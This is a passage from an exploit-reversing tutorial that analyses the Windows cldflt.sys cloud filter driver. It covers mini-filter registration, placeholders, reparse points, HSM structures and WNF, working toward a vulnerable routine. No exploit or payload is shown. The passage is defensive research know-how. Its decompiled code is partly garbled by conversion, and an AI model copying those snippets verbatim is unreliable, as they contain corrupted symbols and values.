![](https://exploitreversing.com/wp-content/uploads/2026/02/images/19808d66135ecebfcd53d13fec6a4f24c4a7ea3edc490c5118ff6555d56ae6ed.jpg)

\[Figure 23\]: Potential paths up to HsmIBitmapNORMALOpen function \| Windows 10 22H2

# 08\. Concepts related to cldflt.sys driver

As we learned from previous articles in this series, a mini-filter driver has the following general execution flow, which can vary according to the mini-filter driver and even its purpose:

The driver registers itself (using the FltRegisterFilter function) as a mini-filter driver with the filter manager (fltmgr.sys) indicating that operations it wants to accomplish while intercepting and processing information. The FltRegisterFilter function has as second argument a reference to \_FLT\_REGISTRATION structure, which contains key information such as a pointer to FLT\_CONTEXT\_REGISTRATION structure and a pointer to FLT\_OPERATION\_REGISTRATION structure. FLT\_CONTEXT\_REGISTRATION structure holds relevant information such as context type (FLT\_FILE\_CONTEXT, FLT\_INSTANCE\_CONTEXT, FLT\_STREAM\_CONTEXT, and other ones), PoolTag and PFLT\_CONTEXT\_ALLOCATE\_CALLBACK, which represents a routine (callback) that contains information such as PoolType (PagedPool or NonPagedPool), Size and FLT\_CONTEXT\_TYPE (already mentioned).

The FLT\_OPERATION\_REGISTRATION structure provides type of the I/O operation (Create, CreatePipe, Read, Write, QueryOpen and multiple others through FLT\_PARAMETERS structure), PreOperation (PFLT\_PRE\_OPERATION\_CALLBACK) and PostOperation (PFLT\_POST\_OPERATION\_CALLBACK) callbacks.

The PFLT\_PRE\_OPERATION\_CALLBACK routine type holds information about the callback data (FLT\_CALLBACK\_DATA structure) and related object (FLT\_RELATED\_OBJECTS).

# [https://exploitreversing.com](https://exploitreversing.com/)

FLT\_CALLBACK\_DATA structure represents the operation and as expected it contains detailed parameters of the request (PFLT\_IO\_PARAMETER\_BLOCK structure).

PFLT\_POST\_OPERATION\_CALLBACK routine type holds similar information to PFLT\_PRE\_OPERATION\_CALLBACK routine type.

▪ After these main steps, the mini-filter driver can call FltStartFiltering function.

Turning to our analysis to foundations, the cldflt.sys works as an interface (or proxy) between applications running on a Windows system, a sync engine, whose functionality is to synchronize files between the local client (the local Windows system) and a remote host (provided by the cloud storage service as OneDrive, for example) and also provides certain security layer because there is the option to encrypt files. The purposed scheme is user application cloud api driver (cldflt.sys) sync engine. As we realized, the final purpose is a perfect integration between the NTFS and the cloud sync engine, which allows to send and receive files over the network to another system on the cloud. This sync engine does the service of downloading and uploading file’s content according to the user’s request while the cldflt.sys (our driver) provides the interaction with shell to make user files available as they were being kept locally, and not on a cloud server. If readers use OneDrive cloud storage service, you already have noticed that files can be shown using three different statuses:

Full pinned file (EXPLOIT\_REVERSING\_05.pdf): the file is available offline because it was hydrated due to request from user through Explorer interface. Full file (EXPLOIT\_REVERSING\_04.pdf): the file was hydrated but is could be dehydrated by the system due to space requirements. Placeholder file (EXPLOIT\_REVERSING\_03.pdf): it is only an empty representation of the file that is accessible if the sync service is available.

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/5ba2aea5be6c380b3097bc8cceb538fec73451cb2a913ab095a51fa2221555d2.jpg)

\[Figure 24\]: OneDrive file samples

Probably readers might be confused about the dehydration concept, but it is a process of converting a full file (with content) into a placeholder file (a reference, an indication of existence), which contains only metadata and that is used for saving storage space. Once the placeholder is accessed, the sync engine rehydrates the file by downloading its content from the cloud. The rehydration is the reverse process when the file is rebuilt using metadata found within the placeholder. Both sync engine and applications can define primary (CF\_HYDRATION\_POLICY\_PRIMARY), which is defined below:

typedef enum CF\_HYDRATION\_POLICY\_PRIMARY { CF\_HYDRATION\_POLICY\_PARTIAL $\\mathit { \\Theta } = \\mathit { \\Theta } \\theta$ CF\_HYDRATION\_POLICY\_PROGRESSIVE $\\mathbf { \\Phi } = \\mathbf { \\Phi } 1$ 1, CF\_HYDRATION\_POLICY\_FULL $= ~ 2$ CF\_HYDRATION\_POLICY\_ALWAYS\_FULL $= 3$ } j

enumeration

The progressive hydration policy is the default, unless specified differently by applications and sync engine. As occurs with other mini-filter drivers, they are activated on one or more volumes at a time and eventually work interacting with other mini-filter drivers and also applications through message ports, all of them being under the control of the filter manager.

The mentioned placeholder file to save storage’s space is obtained through the usage of reparse points, which are a set of user-defined data, which is composed of data and a reparse tag (identifier) that identifies the data being stored and it is interpreted by an application through the mini-filter driver. Once the reparse point is opened/accessed, a file system filter is loaded to manage with its content.

The reparse point data, which also specifies the reparse tag, is stored and represented by

\_REPARSE\_DATA\_BUFFER structure, but this structure can be used only for Microsoft reparse points. Additionally, there are other structures that supplement this first one such as

\_REPARSE\_GUID\_DATA\_BUFFER (it extends the \_REPARSE\_DATA\_BUFFER structure by including a GUID for custom tags used by third-party drivers to store data for a reparse point), FILE\_ATTRIBUTE\_TAG\_INFO (it is used to check that a file has or not an associated reparse tag) and FILE\_REPARSE\_POINT\_INFORMATION (contain information about reparse points, it is populated while scanning the file system and it is used to query information about a reparse point):

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/4c4e62cb43f225462e82032233ed4ea054558358507e30f4e95dc8cd0d01486b.jpg)

\[Figure 26\]: Different structures associated with reparse point.

There are a few valid notes here. Reparse points are not symbolic links and, as explained, they are represented by tags, which a list of them can be found on [https://learn.microsoft.com/en](https://learn.microsoft.com/en)

[https://exploitreversing.com](https://exploitreversing.com/)

us/windows/win32/fileio/reparse-point-tags and [https://learn.microsoft.com/enus/openspecs/windows\_protocols/ms-fscc/c8e77b37-3909-4fe6-a4ea-2b9d423b1ee4](https://learn.microsoft.com/enus/openspecs/windows_protocols/ms-fscc/c8e77b37-3909-4fe6-a4ea-2b9d423b1ee4)

Multiple operations, depending on the value specified in DeviceIoControl function (second argument), can be performed by a mini-filter driver on reparse points such as setting or modifying it itself (FSCTL\_SET\_REPARSE\_POINT), retrieving information stored in a given reparse point (FSCTL\_GET\_REPARSE\_POINT) and removing an existing reparse point (FSCTL\_DELETE\_REPARSE\_POINT).

Retaking the analysis, readers have already noticed that all functions until the routine containing the vulnerability (HsmIBitmapNORMALOpen) are prefixed with HSM, which means Hierarchical Storage Manager, whose tags are described as obsolete. Furthermore, there are other couple of details that could be interesting because the \_REPARSE\_DATA\_BUFFER structure has three fields and one union composed by three structures, where the first two ones (SymbolicLinkReparseBuffer and MountPointReparseBuffer, which are explicitly defined) have a reference to data content (PathBuffer), but the last structure (GenericReparseBuffer) holds only one field (DataBuffer) with a very generic description that it is a “pointer to a buffer that contains Microsoft-defined data for the reparse point”, but there is not further information. Anyway, we can adapt the \_REPARSE\_DATA\_BUFFER structure to our case as being:

typedef struct \_REPARSE\_DATA\_BUFFER { ULONG ReparseTag; USHORT ReparseDataLength; USHORT Reserved; struct { UCHAR DataBuffer\[1\]; } GenericReparseBuffer;

} REPARSE\_DATA\_BUFFER, \*PREPARSE\_DATA\_BUFFER;

As there is a lengthy list of reparse tags (given by the provided links), which some of them identifies and describes the type of data being stored, it is reasonable to admit that there are diverse types of available structures, and each one is appropriate to a determined reparse tag. As consequence, it seems that there could be a structure directly associated with HSM. As usual, we can also do quick searches via WinDbg for functions and structures and, in terms of functions, Microsoft provides us with a good and extensive list of HSM functions related to cldflt.sys mini-filter driver as shown below:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/457cdbed9fd5e844c81a678ca4f3a7ddaaed847eda9cabec57424ca8435ca0fb.jpg)

\[Figure 27\]: \_REPARSE\_DATA\_BUFFER structure adapted to HSM reparse tags

\[Figure 28\]: A brief list of HSM functions from cldflt.sys module (truncated)

However, I was not lucky with data structures, even though there are a few of them in other modules:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/419ec1ed481afc84952e0d1afddde0d7d47e5b3e114e651d2382482279b67986.jpg)

\[Figure 29\]: Trying to list possible HSM data structures

After doing a quick search on Internet, we can find a series of functions, structures and definitions related to HSM, which mostly come from [https://github.com/ladislav-zezula/FileTest](https://github.com/ladislav-zezula/FileTest) (check for files such as ReparseDataHsm.h and WinSDK.h) , as shown below:

# Functions:

HsmpCheckElement(PHSM\_DATA HsmData, ULONG ElementIndex) HsmValidateCommonData(PHSM\_DATA HsmData, ULONG Magic, ULONG ElementCount, ULONG RemainingLength) HsmGetElementData(PHSM\_DATA HsmData, ULONG ElementIndex) HsmUncompressData(PREPARSE\_DATA\_BUFFER RawReparseData, ULONG RawReparseDataLength, PREPARSE\_DATA\_BUFFER $\\star$ OutReparseData) HsmpBitmapIsReparseBufferSupported(PHSM\_DATA HsmData, ULONG RemainingLength) HsmpCheckBitmapElement(PHSM\_DATA HsmData, ULONG ElementIndex) HsmValidateReparseData(PREPARSE\_DATA\_BUFFER ReparseData)

# Structures:

▪ \_HSM\_ELEMENT\_INFO

▪ \_HSM\_DATA

- \_HSM\_REPARSE\_DATA \_REPARSE\_DATA\_BUFFER (that is more complete we learned previously, and includes the HsmReparseBufferRaw structure)

# Definitions:

#define HSM\_BITMAP\_MAGIC 0x70527442 // 'BtRp' #define HSM\_BITMAP\_ELEMENTS $\\Theta \\times \\Theta 5$ // Fixed number of elements for HSM bitmap #define HSM\_FILE\_MAGIC 0x70526546 // 'FeRp' #define HSM\_FILE\_ELEMENTS $\\Theta \\times \\Theta 9$ // Fixed number of elements for HSM reparse data #define HSM\_DATA\_HAVE\_CRC $\\Theta \\times \\Theta 2$ // If set, then the data has CRC #define HSM\_XXX\_DATA\_SIZE $\\Theta \\times \\bot \\Theta$ #define HSM\_MIN\_DATA\_SIZE(elements) (HSM\_XXX\_DATA\_SIZE $^ +$ (elements \* sizeof(HSM\_ELEMENT\_INFO))) #define HSM\_ELEMENT\_TYPE\_NONE 0x00 #define HSM\_ELEMENT\_TYPE\_UINT64 0x06 #define HSM\_ELEMENT\_TYPE\_BYTE 0x07 #define HSM\_ELEMENT\_TYPE\_UINT32 0x0A #define HSM\_ELEMENT\_TYPE\_BITMAP 0x11 #define HSM\_ELEMENT\_TYPE\_MAX 0x12

From the structures mentioned, the respective definitions follow below:

typedef struct \_HSM\_ELEMENT\_INFO

{

USHORT Type; // Type of the element (?). One of

HSM\_ELEMENT\_TYPE\_XXX USHORT Length; // Length of the element data in bytes ULONG Offset; // Offset of the element data, relative to

begin of HSM\_DATA. Aligned to 4 bytes

} HSM\_ELEMENT\_INFO, \*PHSM\_ELEMENT\_INFO;

typedef struct \_HSM\_DATA

{ ULONG Magic; // 0x70527442 ('pRtB') for bitmap data,

0x70526546 ('FeRp') for file data ULONG Crc32; // CRC32 of the following data (calculated

by RtlComputeCrc32) ULONG Length; // Length of the entire HSM\_DATA in bytes USHORT Flags; // HSM\_DATA\_XXXX USHORT NumberOfElements; // Number of elements HSM\_ELEMENT\_INFO ElementInfos\[1\]; // Array of element infos. There are fixed

maximal items for bitmap and reparse data

} HSM\_DATA, \*PHSM\_DATA;

typedef struct \_HSM\_REPARSE\_DATA

{ USHORT Flags; // Lower 8 bits is revision (must be 1 as of Windows

10 16299) // Flags: $\\Theta \\times 8 \\Theta \\Theta \\Theta$ $=$ Data needs to be decompressed by

RtlCompressBuffer USHORT Length; // Length of the HSM\_REPARSE\_DATA structure

(including "Flags" and "Length") HSM\_DATA FileData; // HSM data

} HSM\_REPARSE\_DATA, \*PHSM\_REPARSE\_DATA;

In the Microsoft SDK, the cfapi.h file is really relevant for our purposes and presents the following functions:

CfCloseHandle: Closes the file or directory handle returned by CfOpenFileWithOplock. This should not be used with standard Win32 file handles, only on handles used within CfApi.h. CfConnectSyncRoot: Initiates bi-directional communication between a sync provider and the sync filter API.

▪ CfConvertToPlaceholder: Converts a normal file/directory to a placeholder file/directory. CfCreatePlaceholders: Creates one or more new placeholder files or directories under a sync root tree.

▪ CfDisconnectSyncRoot: Disconnects a communication channel created by CfConnectSyncRoot. CfExecute: The main entry point for all connection key-based placeholder operations. It is intended to be used by a sync provider to respond to various callbacks from the platform. CfGetCorrelationVector: Allows the sync provider to query the current correlation vector for a given placeholder file. CfGetPlaceholderInfo: Gets various characteristics of a placeholder file or folder. CfGetPlaceholderRangeInfo: Gets range information about a placeholder file or folder. CfGetPlaceholderRangeInfoForHydration: Gets range information about a placeholder file or folder using ConnectionKey, TransferKey and FileId as identifiers. CfGetPlaceholderStateFromAttributeTag: Gets a set of placeholder states based on the FileAttributes and ReparseTag values of the file.

CfGetPlaceholderStateFromFileInfo: Gets a set of placeholder states based on the various information of the file.

▪ CfGetPlaceholderStateFromFindData: Gets a set of placeholder states based on the WIN32\_FIND\_DATA structure.

CfGetPlatformInfo: Gets the platform version information.

▪ CfGetSyncRootInfoByHandle: Gets various characteristics of the sync root containing a given file specified by a file handle.

▪ CfGetSyncRootInfoByPath: Gets various sync root information given a file under the sync root.

CfGetTransferKey: Initiates a transfer of data into a placeholder file or folder.

CfGetWin32HandleFromProtectedHandle: Converts a protected handle to a Win32 handle so that it can be used with all handle-based Win32 APIs.

CfHydratePlaceholder: Hydrates a placeholder file by ensuring that the specified byte range is present ondisk in the placeholder. This is valid for files only.

CfOpenFileWithOplock: Opens an asynchronous opaque handle to a file or directory (for both normal and placeholder files) and sets up a proper oplock on it based on the open flags.

CfQuerySyncProviderStatus: Queries a sync provider to get the status of the provider.

CfReferenceProtectedHandle: Allows the caller to reference a protected handle to a Win32 handle which can be used with non CfApi Win32 APIs.

CfRegisterSyncRoot: Performs a one-time sync root registration.

CfReleaseProtectedHandle: Releases a protected handle referenced by CfReferenceProtectedHandle.

CfReleaseTransferKey: Releases a transfer key obtained by CfGetTransferKey.

CfReportProviderProgress: Allows a sync provider to report progress out-of-band.

CfReportProviderProgress2: Allows a sync provider to report progress out-of-band. Extends CfReportProviderProgress with additional parameters.

CfReportSyncStatus: Allows a sync provider to notify the platform of its status on a specified sync root without having to connect with a call to CfConnectSyncRoot first.

CfRevertPlaceholder: Reverts a placeholder back to a regular file, stripping away all special characteristics such as the reparse tag, the file identity, etc.

CfSetCorrelationVector: Allows a sync provider to instruct the platform to use a specific correlation vector for telemetry purposes on a placeholder file. This is optional

CfSetInSyncState: Sets the in-sync state for a placeholder file or folder.

CfSetPinState: This sets the pin state of a placeholder, used to represent a user’s intent. Any application (not just the sync provider) can call this function.

CfUnregisterSyncRoot: Unregisters a previously registered sync root.

CfUpdatePlaceholder: Updates characteristics of the placeholder file or directory.

▪ CfUpdateSyncProviderStatus: Updates the current status of the sync provider.

Obviously, readers do not need to remember all these functions and definitions, but this quick note about them can help you as a guideline to get better comprehension about available possibilities. Additionally, the main recommendation is to put all presented definitions (not functions) into a header file and import them into the IDA Pro to improve the analysis (I have shown how to do it in previous articles). There are other sources of information that will be used through the article, but these few ones are enough for now.

We have got a minimal understanding of general purposes of the cldflt.sys mini-filter driver, and we can proceed and try to understand instructions that are before the HsmFltPostQUERY\_OPEN function, what as explained it is the first of the sequence of functions called up to the possible critical and vulnerable routine. At this point an approach and pattern has come up, and that even being very intuitive, needs to be highlighted: before any reverse engineering task, we have to try to understand the general purpose of the target (a driver, in this article) and collect minimal information about functions, structures, enumeration and respective definitions. Certainly, failures and mistakes will happen, but they are part of the process.

# 09\. Reversing \| part 01 \| WIN11 23H2 and 22H2

A superficial reversed code of the first function (HsmDriverEntry), which provides us with a starting point to analysis, follows below:

\_int64 HsmDriverEntry( PDRIVER\_OBJECT DriverObject, \_int64 RegistryPath, struct\_struct\_arg\_3 \*struct\_arg\_3, ...)

// \[COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND\]

va\_start(args\_1, struct\_arg\_3); // va\_start: initialize the argument list // va\_arg: retrieves the next element

va\_start(args, struct\_arg\_3);

args $=$ va\_arg(args\_1, \_QWORD);

hiword\_RegistryPath $=$ HIDWORD(RegistryPath); // Extracts the high 32 bits.

ObjectName\[0\] $=$ 0x4E004CLL;

ChangeStamp $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ;

Handle $= ~ \\odot \\lfloor ~ \\lfloor ~$ ;

ObjectName\[1\] $=$ (\_\_int64)L"\\Registry\\Machine\\System\\WCOSJunctions";

LOBYTE(args) $= ~ 1$ ;

memset(&ObjectAttributes, $\\odot$ , $\\Theta \\times 2 \ C$ );

KeyHandle $=$ 0LL;

wil\_InitializeFeatureStaging();

InitializeTelemetryAssertsKMByDriverObject((\_\_int64)DriverObject);

TlmInitialize();

memset(&::DriverObject, 0, $\\Theta \\times 4 \ C \\Theta$ uLL);

$\\star$ (struct\_struct\_arg\_3 $\\star$ )\_Config $=$ \*struct\_arg\_3;

::DriverObject $=$ (\_\_int64)DriverObject;

currentProcess $=$ IoGetCurrentProcess();

CldFltReg $=$ (\_CLDFLT\_REGISTRATION\_CONFIG \*)&\_BE;

p\_CldFltRegistration $=$ (\_CLDFLT\_REGISTRATION\_CONFIG $\\star$ )&CldFltRegistration;

counter $=$ 2LL;

do

{ Type $=$ p\_CldFltRegistration->Type; CldFltReg->Start $=$ p\_CldFltRegistration->Start; ImagePath $=$ p\_CldFltRegistration->ImagePath; CldFltReg->Type $=$ Type; v10 = p\_CldFltRegistration->DefaultInstance; CldFltReg->ImagePath $=$ ImagePath; Altitude $=$ p\_CldFltRegistration->Altitude; CldFltReg->DefaultInstance $=$ v10; Flags $=$ p\_CldFltRegistration->Flags; CldFltReg->Altitude $=$ Altitude; InstanceName $=$ p\_CldFltRegistration->InstanceName; CldFltReg->Flags $=$ Flags; InstanceAltitude $=$ p\_CldFltRegistration->InstanceAltitude; p\_CldFltRegistration $=$ (\_CLDFLT\_REGISTRATION\_CONFIG $\\star$ )((char $\\star$ )p\_CldFltRegistration

$\\Theta \\times 8 \\Theta$ ); CldFltReg->InstanceName $=$ InstanceName; CldFltReg $=$ (\_CLDFLT\_REGISTRATION\_CONFIG $\\star$ )((char $\\star$ )CldFltReg + $\\Theta \\times 8 \\Theta$ );

CldFltReg\[ $\\odot \\times$ FFFFFFFF\].InstanceFlags $=$ InstanceAltitude; -counter; } while ( counter ); Type\_1 $=$ p\_CldFltRegistration->Type; CldFltReg->Start $=$ p\_CldFltRegistration->Start; ImagePath\_1 $=$ p\_CldFltRegistration->ImagePath; CldFltReg->Type $=$ Type\_1; DefaultInstance $=$ p\_CldFltRegistration->DefaultInstance; CldFltReg->ImagePath $=$ ImagePath\_1; Altitude\_1 $=$ p\_CldFltRegistration->Altitude; CldFltReg->DefaultInstance $=$ DefaultInstance; CldFltReg->Altitude $=$ Altitude\_1; HsmpDbgInitialize(); // Prepare for service debugging. status $=$ HsmOsIsVailSupported(&arg\_status); if... ObjectAttributes.Length $= ~ \\odot \\times 3 \\odot$ ; ObjectAttributes.ObjectName $=$ (PUNICODE\_STRING)ObjectName; ObjectAttributes.RootDirectory $= ~ \\odot \\lfloor ~ \\lfloor ~$ ; ObjectAttributes.Attributes $=$ OBJ\_KERNEL\_HANDLE\_INSENSITIVE; \*(\_OWORD $\\star$ )&ObjectAttributes.SecurityDescriptor $=$ 0LL; zwopenkey\_status $=$ ZwOpenKey(&KeyHandle, KEY\_READ, &ObjectAttributes); status $=$ zwopenkey\_status; if ( zwopenkey\_status $= =$ (unsigned int)STATUS\_OBJECT\_NAME\_NOT\_FOUND ) { BufferStatus $= ~ 1$ ; status $=$ ExSubscribeWnfStateChange( &Subscription, &WNF\_DEP\_OOBE\_COMPLETE, // StateName 1LL, // DeliveryOption 0LL, // CurrentChangeStamp HsmiOOBECompleteWnfCallback, // Callback 0LL); // CallbackContext HsmDbgBreakOnStatus(status); if... status $=$ HsmOsCheckIfSetupInProgress(Subscription, (bool $\\star$ )&BufferStatus, &ChangeStamp); HsmDbgBreakOnStatus(status); if... } else { if ( zwopenkey\_status < 0 ) goto LABEL\_74; ZwClose(KeyHandle); BufferStatus $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; } ptrVar\_Incremented $=$ \*(\_QWORD $\\star$ )&MEMORY\[ $\\Theta \\times$ FFFFF78000000014\].TickCountLowDeprecated; status $=$ HsmFileCacheInitialize(DriverObject); HsmDbgBreakOnStatus(status); if ( status $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ ) { \*(\_QWORD $\\star$ )&Registration.Size $=$ 0x802030070LL; Registration.ContextRegistration $=$ &g\_HsmContextRegistration; memset(&Registration.InstanceTeardownStartCallback, 0, $\\Theta \\times 3 \\Theta$ ); Registration.OperationRegistration $=$ &g\_HsmFltCallbacks;

Registration.InstanceSetupCallback $=$

(PFLT\_INSTANCE\_SETUP\_CALLBACK)HsmFltInstanceSetup; Registration.FilterUnloadCallback $=$ (PFLT\_FILTER\_UNLOAD\_CALLBACK)HsmFlt Registration.InstanceQueryTeardownCallback $=$

(PFLT\_INSTANCE\_QUERY\_TEARDOWN\_CALLBACK)HsmFltInstanceQueryTeardown; \*(\_OWORD $\\star$ )&Registration.NormalizeNameComponentExCallback $=$ 0LL; status $=$ HsmpCheckUpperInstanceRegNeeded(&\_BE, (bool $\\star$ )args); HsmDbgBreakOnStatus(status); if ( status $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ ) { if ( (\_BYTE)args ) { \*(\_QWORD $\\star$ )&ValueName.Length $=$ 0x120010LL; ValueName.Buffer $=$ (PWSTR)L"Altitude"; status $=$ HsmpOpenInstancesRegistryKey(&\_BE, &Handle); HsmDbgBreakOnStatus(status); if... status $=$ ZwSetValueKey(Handle, &ValueName, 0, 1u, struct\_01.Buffer,

struct\_01.MaximumLength); HsmDbgBreakOnStatus(status); if... status $=$ FltRegisterFilter(DriverObject, &Registration, &Filter); HsmDbgBreakOnStatus(status); if... FltUnregisterFilter(Filter); status $=$ ZwSetValueKey( Handle, &ValueName, 0, 1u, ::Altitude.Buffer, ::Altitude.MaximumLength); HsmDbgBreakOnStatus(status); if... } status $=$ FltRegisterFilter(DriverObject, &Registration, &Filter); HsmDbgBreakOnStatus(status); if ( status $> =$ STATUS\_SUCCESS ) { KeInitializeSpinLock(&SpinLock); qword\_1C00270B8 $=$ (\_\_int64)&qword\_1C00270B0; qword\_1C00270B0 $=$ (\_\_int64)&qword\_1C00270B0; ExInitializePagedLookasideList( &ptr\_paged\_lookaside\_list, 0LL, 0LL, POOL\_NX\_ALLOCATION, $\\Theta \\times 6 \\Theta$ uLL, 'eSsH', 0); E $\\times$ InitializePagedLookasideList( &Lookaside\_0, 0LL, 0LL, POOL\_NX\_ALLOCATION, $\\Theta \\times \\mathsf { B } \\Theta$ uLL,

'cRsH', 0); ExInitializePagedLookasideList( &Lookaside\_1, 0LL, 0LL, POOL\_NX\_ALLOCATION, 0x58uLL, 'cRsH', 0); E $\\times$ InitializePagedLookasideList( &Lookaside\_2, 0LL, 0LL, POOL\_NX\_ALLOCATION, $\\Theta \\times 3 \\Theta \\Theta$ uLL, 'rOsH', 0); FltInitExtraCreateParameterLookasideList(Filter, &EcpType, 0, 0x10uLL, 'rOsH'); FltInitExtraCreateParameterLookasideList(Filter, &EcpType\_0, 0, 0x58uLL, 'cAsH'); FltInitExtraCreateParameterLookasideList(Filter, &EcpType\_1, 0, 8uLL, 'pOsH'); $\\scriptstyle \\mathtt { \\mathtt { O y t e \_ l c } } \\mathtt { C } \\mathtt { G } \\mathtt { G } 2 7 \\odot \\mathtt { C } \\mathtt { G } \ = \ \\mathtt { l }$ ; status $=$ FltStartFiltering(Filter);

This routine, which has been superficially reversed, it is the first step to track events until the potentially vulnerable code. Comments about relevant code follow below:

We see \\Registry\\Machine\\System\\WCOSJunctions. This is a reference to junctions, which means that this instruction is a redirection to an eventual registry entry.

I have omitted most code referring to WPP (Windows Software Trace Preprocessor), which is used for tracing, logging, and debugging. Thus, most of time, when readers see “If…”, there is a hidden WPP code there.

The code starts interacting with the registry key that represents the service associated with the cldflt.sys mini-filter driver. Up to two instances could be registered, but there is only one in this system, and value-entries may change depending on the Windows version being analyzed. I have created a structure type named \_CLDFLT\_REGISTRATION, which contains Type, Start, ImagePath, DefaultInstance, Flags, Altitude, and InstanceAltitude fields.

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/47297af9de2ad03fe34603d2836b0652a6a3c341d2e229a17ead7c51d3e62291.jpg)

\[Figure 30\]: HsmDriverEntry code

▪ The Registry entry that holds parameters related to the cldflt.sys’ service entry is the HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CldFlt, as shown below:

# [https://exploitreversing.com](https://exploitreversing.com/)

The HsmpDbgInitialize( ) routine prepares the service for debugging and sets breakpoints on open and hydration events through the inclusion of a key at \\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s\\Debug with Flags, BreakOnHydration and BreakOnOpen value-entries. char HsmpDbgInitialize() { NTSTATUS status; // eax status $=$ RtlStringCchPrintfW( \_DEBUG, $\\Theta \\times 8 \\Theta$ uLL, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s\\Debug", \_BE.Buffer); if ( status $> =$ 0 ) { HsmpGetRegDword(\_DEBUG, L"Flags", &dword\_1C0026E10); HsmpGetRegDword(\_DEBUG, L"BreakOnHydration", &dword\_1C0027044); HsmpGetRegDword(\_DEBUG, L"BreakOnOpen", &dword\_1C0027048); LOBYTE(status) $=$ RtlIsStateSeparationEnabled(); if ( (\_BYTE)status ) { status $=$ RtlStringCchPrintfW( \_DEBUG, $\\Theta \\times 8 \\Theta \\cup \\lfloor \\lfloor$ , L"\\Registry\\Machine\\OSDATA\\Software\\Microsoft\\%s\\Debug", \_BE.Buffer); if ( status $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ ) { HsmpGetRegDword(\_DEBUG, L"Flags", &dword\_1C0026E10); HsmpGetRegDword(\_DEBUG, L"BreakOnHydration", &dword\_1C0027044); LOBYTE(status) $=$ HsmpGetRegDword(\_DEBUG, L"BreakOnOpen", &dword\_1C0027048); } } } return status; }

In HsmOsIsVailSupported routine, there is a check for the presence of an API set named SchemaExtComposable-Vail, which could be related to Registry, but I couldn’t find further details. At line 69, the ZwOpenKey function is called to open exactly \\Registry\\Machine\\System\\WCOSJunctions path that we mentioned previously. If the entry does not exist, then things quickly get interesting because a function named ExSubscribeWnfStateChange will be called. It is time for a little break to explain about WNF.

WFN states for Windows Notification Facility (WNF). WNF makes part of the kernel aims to distribute notifications across the Windows system to notify about the occurrence of an event or state change. Applications become eligible to receive such notifications by subscribing using ExSubscribeWnfStateChange function (a subscription is represented by the \_WNF\_SUBSCRIPTION structure) to an event type offered by a publisher (service), which is triggered according to a determined condition. Existing events are named as

[https://exploitreversing.com](https://exploitreversing.com/)

WNF State Name, described by a WNF\_STATE\_INSTANCE structure, and respective types are given by the \_WNF\_DATA\_SCOPE enumeration. Probably, one of the most relevant WNF structures is \_WNF\_NAME\_INSTANCE, which holds distinct types of fields and information, including registrations (StateNameInfo \| \_WNF\_STATE\_NAME\_REGISTRATION), state data (StateData \| \_WNF\_STATE\_DATA) and creator process (CreatorProcess \| \_EPROCESS), for example.

As expected, different Windows components make use of the WFN, and one of them is exactly the Process Manager, which implements a channel that is used to force processes to wake up depending on whether certain events are triggered. Additionally, events are associated with a scope (\_WNF\_SCOPE\_INSTANCE), which restricts and limits what kind of information is available to be accessed. As there are multiple WNF structures and enumerations, readers can list available ones (exposed by Microsoft) by running the following command one WinDbg:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/5d4e1dccd9b47ca18cb02d8bd525aeb2f3ddfed6205da866ccc4ae1328c13299.jpg)

\[Figure 33\]: Listing available WNF structures and enumerations

\[Figure 34\]: \_WNF\_NAME\_INSTANCE structure

Depending on your system and hardware, the kernel could has a different name. At the same way, it is easy to check any of these enumerations or structures mentioned as shown below:

|     |     |     |     |
| --- | --- | --- | --- |
| 0:kd> |  | , dt ntkrnImp!\_WNF\_NAME\_INSTANCE+0x000 Header \_WNF\_NODE\_HEADER |
|  | +0x000 |  |
|  | +0x008 |  | \_EX\_RUNDOWN REF+0x010 TreeLinks \_RTL\_BALANCED\_NODE |
|  | +0x010 |  |
|  | +0x028 | +0x028 StateName \_WNF\_STATE\_NAME\_STRUCT |
|  | +0x030 |  |  |
|  | +0x038 |  |  |
|  | +0x050 |  | +0x050 StateDataLock \_WNF\_LOCK+0x058 StateData : Ptr64 \_WNF\_STATE\_DATA9 CurrentChangeStamp : Uint4B+0x068 PermanentDataStore : Ptr64 \_WNF\_PERMANENT\_DATA\_STORE+0x07e StateSubscriptionListLock : \_WNF\_LOCK+0x078 StateSubscriptionListHead : \_LIST\_ENTRY+0x088 TemporaryNameListEntry : \_LIST\_ENTRY |
|  | +0x058 |  |
|  | +0x060 |  |
|  | +0x068 |  |
|  | +0x070 |  |
|  | +0x078 |  | +0x078 StateSubscriptionListHead : \_LIST\_ENTRY+0x088 TemporaryNameListEntry : \_LIST\_ENTRY+0x098 CreatorProcess : Ptr64 \_EPROCESS+0x0a0 DataSubscribersCount : Int4B+0x0a4 CurrentDeliveryCount : Int4B |
|  | +0x088 |  |
|  | +0x098 |  | +0x098 CreatorProcess |
|  | +0x0a0 |  | +0x0a0 DataSubscribersCount : Int4B |
| +0x0a4 |  |

An alternative would be to download the PDB file associated with the kernel and extract its content to have a better representation, which could be used later:

symchk /v /r C:\\windows\\system32\\ntkrnlmp.exe /s srv\*C:\\symbols\* [https://msdl.microsoft.com/download/symbols](https://msdl.microsoft.com/download/symbols)

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/68482ead176253d217a11c4cf78f61a372b0a2e1a49f001c161135433ba1c529.jpg)

\[Figure 35\]: \_WNF\_DATA\_SCOPE enumeration

Each scope itself is defined by the \_WNF\_SCOPE\_INSTANCE structure:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/03a6ab6495947bf8ea0e48a40ff161fab67c08e40f1aa9b0a262dca02afc387d.jpg)

\[Figure 36\]: \_WNF\_SCOPE\_INSTANCE enumeration

